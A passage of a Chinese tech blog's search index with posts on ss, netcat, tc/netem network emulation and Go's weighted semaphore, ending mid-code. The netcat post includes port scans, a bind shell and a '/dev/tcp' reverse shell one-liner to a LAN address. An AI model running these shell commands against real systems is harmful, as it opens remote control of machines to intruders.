和bucket相反.</span></span><br></pre></td></tr></tbody></table></figure><p><strong>显示 Sockets 摘要</strong></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# ss -s</span><br><span class="line">Total: 172 (kernel 189)</span><br><span class="line">TCP:   10 (estab 2, closed 4, orphaned 0, synrecv 0, timewait 0/0), ports 5</span><br><span class="line"></span><br><span class="line">Transport Total     ip        IPv6</span><br><span class="line">*         189       -         -</span><br><span class="line">RAW       0         0         0</span><br><span class="line">UDP       5         5         0</span><br><span class="line">TCP       6         6         0</span><br><span class="line">INET      11        11        0</span><br><span class="line">FRAG      0         0         0</span><br></pre></td></tr></tbody></table></figure><p>列出当前的established, closed, orphaned and waiting TCP sockets</p><p><strong>查看TCP的连接状态</strong></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# ss  -tan|awk 'NR&gt;1{++S[$1]}END{for (a in S) print a,S[a]}'</span><br><span class="line">LISTEN 7</span><br><span class="line">ESTAB 31</span><br><span class="line">TIME-WAIT 28</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络-抓包工具tcpdump</title>
      <link href="/%E7%BD%91%E7%BB%9C/2023-02-01-%E7%BD%91%E7%BB%9C-%E6%8A%93%E5%8C%85%E5%B7%A5%E5%85%B7tcpdump/"/>
      <url>/%E7%BD%91%E7%BB%9C/2023-02-01-%E7%BD%91%E7%BB%9C-%E6%8A%93%E5%8C%85%E5%B7%A5%E5%85%B7tcpdump/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络-网络工具nc</title>
      <link href="/%E7%BD%91%E7%BB%9C/2023-02-01-%E7%BD%91%E7%BB%9C-%E7%BD%91%E7%BB%9C%E5%B7%A5%E5%85%B7nc/"/>
      <url>/%E7%BD%91%E7%BB%9C/2023-02-01-%E7%BD%91%E7%BB%9C-%E7%BD%91%E7%BB%9C%E5%B7%A5%E5%85%B7nc/</url>
      
        <content type="html"><![CDATA[<h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><p>nc是网络工具中的瑞士军刀。<strong>nc命令</strong> 全称<strong>netcat</strong>，用于TCP、UDP或unix域套接字(uds)的数据流操作，它可以打开TCP连接，发送UDP数据包，监听任意TCP 和UDP端口，同时也可用作做端口扫描，支持IPv4和IPv6，与Telnet的不同在于nc可以编写脚本。</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc [-hlnruz][-g&lt;网关...&gt;][-G&lt;指向器数目&gt;][-i&lt;延迟秒数&gt;][-o&lt;输出文件&gt;][-p&lt;通信端口&gt;]</span><br><span class="line">[-s&lt;来源位址&gt;][-v...][-w&lt;超时秒数&gt;][主机名称][通信端口...]</span><br></pre></td></tr></tbody></table></figure><h3 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">-4 只使用IPV4</span><br><span class="line">-6 只使用IPV6</span><br><span class="line">-c 使用tls连接或者监听</span><br><span class="line">-D 启用socket调试开关</span><br><span class="line">-g &lt;网关&gt; # 设置路由器跃程通信网关，最多可设置8个。</span><br><span class="line">-G&lt;指向器数目&gt; # 设置来源路由指向器，其数值为4的倍数。</span><br><span class="line">-h 在线帮助。</span><br><span class="line">-i&lt;延迟秒数&gt; 设置时间间隔，以便传送信息及扫描通信端口。</span><br><span class="line">-l 使用监听模式，管控传入的资料。</span><br><span class="line">-n 直接使用IP地址，而不通过域名服务器。</span><br><span class="line">-o&lt;输出文件&gt; # 指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。</span><br><span class="line">-p&lt;通信端口&gt; # 设置本地主机使用的通信端口。</span><br><span class="line">-r 乱数指定本地与远端主机的通信端口。</span><br><span class="line">-s&lt;来源位址&gt; # 设置本地主机送出数据包的IP地址。</span><br><span class="line">-u 使用UDP传输协议。</span><br><span class="line">-v 显示指令执行过程。</span><br><span class="line">-w&lt;超时秒数&gt; # 设置等待连线的时间。</span><br><span class="line">-z 使用0输入/输出模式，只在扫描通信端口时使用。</span><br></pre></td></tr></tbody></table></figure><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><p><strong>TCP端口扫描</strong></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# nc -v -z -w2 192.168.0.3 1-100 </span><br><span class="line">192.168.0.3: inverse host lookup failed: Unknown host</span><br><span class="line">(UNKNOWN) [192.168.0.3] 80 (http) open</span><br><span class="line">(UNKNOWN) [192.168.0.3] 23 (telnet) open</span><br><span class="line">(UNKNOWN) [192.168.0.3] 22 (ssh) open</span><br></pre></td></tr></tbody></table></figure><p>扫描192.168.0.3 的端口 范围是 1-100 <strong>扫描UDP端口</strong></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# nc -u -z -w2 192.168.0.3 1-1000  # 扫描192.168.0.3 的端口 范围是 1-1000</span><br></pre></td></tr></tbody></table></figure><p><strong>扫描指定端口</strong></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# nc -nvv 192.168.0.1 80 # 扫描 80端口</span><br><span class="line">(UNKNOWN) [192.168.0.1] 80 (?) open</span><br><span class="line">y  //用户输入</span><br></pre></td></tr></tbody></table></figure><p>查看从服务器到目的地的出站端口 443 是否被防火墙阻止</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -vz acme-v02.api.letsencrypt.org 443 -w2</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Ncat: Version 7.50 ( https://nmap.org/ncat )</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Ncat: Connected to 23.77.214.183:443.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Ncat: 0 bytes sent, 0 bytes received <span class="keyword">in</span> 0.07 seconds.</span></span><br></pre></td></tr></tbody></table></figure><p><strong>文件传输</strong></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">接收方提前设置监听端口与要接收的文件名（文件名可自定义）：</span></span><br><span class="line">nc -lp 8888 &gt; node.tar.gz</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">传输方发文件：</span></span><br><span class="line">nc -nv 192.168.75.121 8888  &lt; node_exporter-1.3.1.linux-amd64.tar.gz</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">⚠️ 注意：192.168.75.121是接收方的ip地址。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果希望文件传输结束后自动退出，可以使用下面的命令：</span></span><br><span class="line">nc -lp 8888 &gt; node.tar.gz</span><br><span class="line">nc -nv 192.168.75.121 8888 -i 1 &lt; node_exporter-1.3.1.linux-amd64.tar.gz</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">⚠️ 注意：-i 表示闲置超时时间</span></span><br></pre></td></tr></tbody></table></figure><p><strong>远程控制</strong></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">正向控制，被控端主动设置监听端口及bash环境，控制端连接，如果有防火墙，需开放端口，否则会被拦截。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">被控制端执行下面的命令：</span></span><br><span class="line">nc -lvnp 8888 -c bash</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">控制端执行下面的命令：</span></span><br><span class="line">nc 192.168.75.121 8888</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">反向控制，控制端设置监听端口，被控端主动连接控制端的ip及端口，并提供bash环境。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">控制端执行下面的命令：</span></span><br><span class="line">nc -lvnp 8888</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">被控制端执行下面的命令：</span></span><br><span class="line">nc 192.168.75.121 8888 -c bash</span><br></pre></td></tr></tbody></table></figure><p><strong>反弹shell</strong></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">控制端执行下面的命令：</span></span><br><span class="line">nc -lvnp 8888</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">被控端执行下面的命令:</span></span><br><span class="line">bash -i &amp;&gt; /dev/tcp/192.168.75.121/8888 0&gt;&amp;1</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux下使用tc模拟网络延迟和丢包</title>
      <link href="/%E7%BD%91%E7%BB%9C/2023-02-01-%E7%BD%91%E7%BB%9C-Linux%E4%B8%8B%E4%BD%BF%E7%94%A8tc%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%BB%9C%E5%BB%B6%E8%BF%9F%E5%92%8C%E4%B8%A2%E5%8C%85/"/>
      <url>/%E7%BD%91%E7%BB%9C/2023-02-01-%E7%BD%91%E7%BB%9C-Linux%E4%B8%8B%E4%BD%BF%E7%94%A8tc%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%BB%9C%E5%BB%B6%E8%BF%9F%E5%92%8C%E4%B8%A2%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<h3 id="模拟延迟传输简介"><a href="#模拟延迟传输简介" class="headerlink" title="模拟延迟传输简介"></a>模拟延迟传输简介</h3><p>netem 与 tc: netem 是 Linux 2.6 及以上内核版本提供的一个网络模拟功能模块。该功能模块可以用来在性能良好的局域网中,模拟出复杂的互联网传输性能,诸如低带宽、传输延迟、丢包等等情况。使用 Linux 2.6 (或以上) 版本内核的很多发行版 Linux 都开启了该内核功能,比如 Fedora、Ubuntu、Redhat、OpenSuse、CentOS、Debian 等等。 tc 是Linux 系统中的一个工具,全名为 traffic control(流量控制)。tc 可以用来控制 netem 的工作模式,也就是说,如果想使用 netem ,需要至少两个条件,一个是内核中的 netem 功能被包含,另一个是要有 tc 。</p><p>需要注意的是:本文介绍的流控只能控制发包动作,不能控制收包动作,同时,它直接对物理接口生效,如果控制了物理的 eth0,那么逻辑网卡(比如 eth0:1)也会受到影响,反之,如果您在逻辑网卡上做控制,该控制可能是无效的。(注:虚拟机中的多个网卡可以在虚拟机中视为多个物理网卡)。</p><h3 id="TC是什么"><a href="#TC是什么" class="headerlink" title="TC是什么"></a>TC是什么</h3><p>TC 全称 Traffic Control，是 Linux 内核提供的流量限速、整形和策略控制的机制。它利用一些队列规则来处理数据包的队列，并定义队列中的数据包被发送的方式， 从而实现对流量的控制。TC 使用的队列规则分为两类，一类是无类别队列规则， 另一类是分类队列规则。 无类别队列规则相对简单，而分类队列规则则引出了分类和过滤器等概念，使其流量控制功能增强。在分布式系统实验中，通常用于对进出网卡的数据包进行控制，进而模拟网络延时和带宽。</p><p>流量的控制通常发生在输出网卡处，我们可以通过改变发送次序来控制传输速率。流量控制的一个基本概念是队列，每个网卡都与一个队列相联系，可以说，所有的流量控制都发生在队列中（没有入向队列）。</p><h3 id="流量控制术语"><a href="#流量控制术语" class="headerlink" title="流量控制术语"></a>流量控制术语</h3><ul><li>Scheduling（调度）：判断某些包是不是要先于其他包发送出去，这个过程称为调度，也被成为 Reordering（重排序）。</li><li>Shaping（整形）：在包发送出去之前进行延迟处理，以达到预设的最大发送速率的过程。</li><li>Policing（执行策略）：延迟或丢弃包来达到预设带宽。</li><li>Dropping（丢弃）：如果流量超过设定带宽，则丢弃数据包，不管是入向还是出向。</li><li>Work-Conserving（随到随发）：只要有包可发送就立即发送。</li><li>non-Work-Conserving（非随到随发）：可能会延迟一段时间再将一个包发送出去，以达到期望的带宽 。这意味着它们有时即使有能力发送，也不会发送。</li></ul><h4 id="延迟"><a href="#延迟" class="headerlink" title="延迟"></a>延迟</h4><ol><li><p>延迟</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">eth0 网卡的传输设置为延迟 100 毫秒发送</span></span><br><span class="line">tc qdisc add dev eth0 root netem delay 100ms</span><br></pre></td></tr></tbody></table></figure></li><li><p>延迟+抖动</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">eth0 网卡的传输设置为延迟 100ms ± 10ms (90 ~ 110 ms 之间的任意值)发送</span></span><br><span class="line">tc qdisc add dev eth0 root netem delay 100ms 10ms</span><br></pre></td></tr></tbody></table></figure></li><li><p>延迟+抖动+随机</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">eth0 网卡的传输设置为 100ms ,同时,大约有 30% 的包会延迟 ± 10ms 发送</span></span><br><span class="line">tc qdisc add dev eth0 root netem delay 100ms 10ms 30%</span><br></pre></td></tr></tbody></table></figure></li></ol><h4 id="丢包"><a href="#丢包" class="headerlink" title="丢包"></a>丢包</h4><ol><li><p>丢包</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">eth0 网卡的传输设置为随机丢掉 1% 的数据包</span></span><br><span class="line">tc qdisc add dev eth0 root netem loss 1%</span><br></pre></td></tr></tbody></table></figure></li><li><p>丢包+随机</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">eth0 网卡的传输设置为随机丢掉 1% 的数据包,成功率为 30%</span></span><br><span class="line">tc qdisc add dev eth0 root netem loss 1% 30%</span><br></pre></td></tr></tbody></table></figure></li></ol><h4 id="包重复"><a href="#包重复" class="headerlink" title="包重复"></a>包重复</h4><ol><li><p>重复数据包</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">eth0 网卡的传输设置为随机产生 1% 的重复数据包</span></span><br><span class="line">tc qdisc add dev eth0 root netem duplicate 1%</span><br></pre></td></tr></tbody></table></figure></li></ol><h4 id="包损坏"><a href="#包损坏" class="headerlink" title="包损坏"></a>包损坏</h4><ol><li><p>数据包损坏(内核版本需在 2.6.16 以上)</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">eth0 网卡的传输设置为随机产生 0.2% 的损坏的数据包</span> </span><br><span class="line">tc qdisc add dev eth0 root netem corrupt 0.2%</span><br></pre></td></tr></tbody></table></figure></li></ol><h4 id="包乱序"><a href="#包乱序" class="headerlink" title="包乱序"></a>包乱序</h4><ol><li><p>数据包乱序</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">eth0 网卡的传输设置为:有 25% 的数据包(50%相关)会被立即发送,其他的延迟10 秒</span></span><br><span class="line">tc qdisc change dev eth0 root netem delay 10ms reorder 25% 50%</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">新版本中,如下命令也会在一定程度上打乱发包的次序</span></span><br><span class="line">tc qdisc add dev eth0 root netem delay 100ms 10ms</span><br></pre></td></tr></tbody></table></figure></li></ol><h4 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h4><ol><li><p>查看配置</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tc qdisc show dev eth0</span><br></pre></td></tr></tbody></table></figure></li></ol><h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><ol><li><p>删除配置</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除 eth0 网卡的相关传输配置</span></span><br><span class="line">tc qdisc del dev eth0 XXXXXXXXXXX(自己加的配置)</span><br></pre></td></tr></tbody></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang-信号量semaphore</title>
      <link href="/Code/Code-Golang-semaphore/"/>
      <url>/Code/Code-Golang-semaphore/</url>
      
        <content type="html"><![CDATA[<div class="note info no-icon">      <a class="no-line-link" href="../../scode">本文分类《源码计划》</a></div><h2 id="semaphore"><a href="#semaphore" class="headerlink" title="semaphore"></a>semaphore</h2><p>带权重的信号量在Golang中提供了一种灵活的机制，用于管理对共享资源的并发访问。通过合理使用带权重的信号量，可以更好地平衡并发访问和资源使用，从而提高程序的性能和稳定性</p><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 一个 watier 就表示一个请求，其中n表示这次请求的资源数量</span></span><br><span class="line"><span class="keyword">type</span> waiter <span class="keyword">struct</span> {</span><br><span class="line">n     <span class="type">int64</span></span><br><span class="line">ready <span class="keyword">chan</span>&lt;- <span class="keyword">struct</span>{} <span class="comment">// Closed when semaphore acquired.</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Weighted <span class="keyword">struct</span> {</span><br><span class="line">  <span class="comment">// 最大资源数量，取走时会减少，释放时会增加</span></span><br><span class="line">size    <span class="type">int64</span></span><br><span class="line">  <span class="comment">// 记录当前已使用资源数，值范围[0 - size]</span></span><br><span class="line">cur     <span class="type">int64</span></span><br><span class="line">mu      sync.Mutex</span><br><span class="line">  <span class="comment">// 当前处于等待休眠的请求者goroutine，每个请求者请求的资源数量可能不一样，只有在请求时，可用资源数量不足时请求者才会进入请求链表，每个请求者表示一个goroutine</span></span><br><span class="line">waiters list.List</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="方法列表"><a href="#方法列表" class="headerlink" title="方法列表"></a>方法列表</h3><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一类资源，参数 n 资源表示最大可用资源总个数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewWeighted</span><span class="params">(n <span class="type">int64</span>)</span></span> *Weighted</span><br><span class="line"><span class="comment">// 获取指定个数的资源，如果当前没有空闲资源可用，当前请求者goroutine将陷入休眠状态</span></span><br><span class="line"><span class="comment">// 可以一次获取多个资源，如果没有足够多的资源，调用者就会被阻塞。它的第一个参数是 Context，这就意味着，你可以通过 Context 增加超时或者 cancel 的机制。如果是正常获取了资源，就返回 nil；否则，就返回 ctx.Err()，信号量不改变</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Weighted)</span></span> Acquire(ctx context.Context, n <span class="type">int64</span>) <span class="type">error</span></span><br><span class="line"><span class="comment">// 释放资源</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Weighted)</span></span> Release(n <span class="type">int64</span>)</span><br><span class="line"><span class="comment">// 同 Acquire 一样，但当无空闲资源将直接返回false，而不阻塞</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Weighted)</span></span> TryAcquire(n <span class="type">int64</span>) <span class="type">bool</span></span><br></pre></td></tr></tbody></table></figure><h3 id="Acquire-和-TryAcquire"><a href="#Acquire-和-TryAcquire" class="headerlink" title="Acquire 和 TryAcquire"></a>Acquire 和 TryAcquire</h3><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Weighted)</span></span> Acquire(ctx context.Context, n <span class="type">int64</span>) <span class="type">error</span> {</span><br><span class="line">    s.mu.Lock()</span><br><span class="line">    <span class="comment">// 如果恰好有足够的资源，也没有排队等待获取资源的goroutine，</span></span><br><span class="line">    <span class="comment">// 将cur加上n后直接返回</span></span><br><span class="line">    <span class="keyword">if</span> s.size-s.cur &gt;= n &amp;&amp; s.waiters.Len() == <span class="number">0</span> {</span><br><span class="line">      s.cur += n</span><br><span class="line">      s.mu.Unlock()</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    }</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 请求的资源数大于能提供的最大的资源数</span></span><br><span class="line">    <span class="comment">// 这个任务处理不了，走错误处理逻辑</span></span><br><span class="line">    <span class="keyword">if</span> n &gt; s.size {</span><br><span class="line">      s.mu.Unlock()</span><br><span class="line">      <span class="comment">// 依赖ctx的状态返回，否则一直等待</span></span><br><span class="line">      &lt;-ctx.Done()</span><br><span class="line">      <span class="keyword">return</span> ctx.Err()</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">// 现存资源不够, 需要把调用者加入到等待队列中</span></span><br><span class="line">    <span class="comment">// 创建了一个ready chan,以便被通知唤醒</span></span><br><span class="line">    ready := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>{})</span><br><span class="line">    w := waiter{n: n, ready: ready}</span><br><span class="line">    elem := s.waiters.PushBack(w)</span><br><span class="line">    s.mu.Unlock()</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待</span></span><br><span class="line">    <span class="keyword">select</span> {</span><br><span class="line">    <span class="keyword">case</span> &lt;-ctx.Done(): <span class="comment">// context的Done被关闭</span></span><br><span class="line">      err := ctx.Err()</span><br><span class="line">      s.mu.Lock()</span><br><span class="line">      <span class="keyword">select</span> {</span><br><span class="line">      <span class="keyword">case</span> &lt;-ready: <span class="comment">// 如果被唤醒了，忽略ctx的状态</span></span><br><span class="line">        err = <span class="literal">nil</span></span><br><span class="line">      <span class="keyword">default</span>: <span class="comment">// 通知waiter</span></span><br><span class="line">        isFront := s.waiters.Front() == elem</span><br><span class="line">        <span class="comment">// 已经通过ctx退出了，删除</span></span><br><span class="line">        s.waiters.Remove(elem)</span><br><span class="line">        <span class="comment">// 如果当前元素正好位于链表最前面，且还存在可用的资源，就通知其它waiters</span></span><br><span class="line">        <span class="keyword">if</span> isFront &amp;&amp; s.size &gt; s.cur {</span><br><span class="line">          s.notifyWaiters()</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">      s.mu.Unlock()</span><br><span class="line">      <span class="keyword">return</span> err</span><br><span class="line">    <span class="keyword">case</span> &lt;-ready: <span class="comment">// 等待者被唤醒了</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Weighted)</span></span> TryAcquire(n <span class="type">int64</span>) <span class="type">bool</span> {</span><br><span class="line">s.mu.Lock()</span><br><span class="line">success := s.size-s.cur &gt;= n &amp;&amp; s.waiters.Len() == <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> success {</span><br><span class="line">s.cur += n</span><br><span class="line">}</span><br><span class="line">s.mu.Unlock()</span><br><span class="line"><span class="keyword">return</span> success</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Weighted)</span></span> notifyWaiters() {</span><br><span class="line">    <span class="keyword">for</span> {</span><br><span class="line">      next := s.waiters.Front()</span><br><span class="line">      <span class="keyword">if</span> next == <span class="literal">nil</span> {</span><br><span class="line">        <span class="keyword">break</span> <span class="comment">// 没有等待者了，直接返回</span></span><br><span class="line">      }</span><br><span class="line">  </span><br><span class="line">      w := next.Value.(waiter)</span><br><span class="line">      <span class="keyword">if</span> s.size-s.cur &lt; w.n {</span><br><span class="line">        <span class="comment">// 如果现有资源不够队列头调用者请求的资源数，就退出所有等待者会继续等待</span></span><br><span class="line">        <span class="comment">// 这里还是按照先入先出的方式处理是为了避免饥饿</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">      }</span><br><span class="line">      s.cur += w.n</span><br><span class="line">      s.waiters.Remove(next)</span><br><span class="line">      <span class="built_in">close</span>(w.ready)</span><br><span class="line">    }</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><h3 id="Release"><a href="#Release" class="headerlink" title="Release"></a>Release</h3><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span 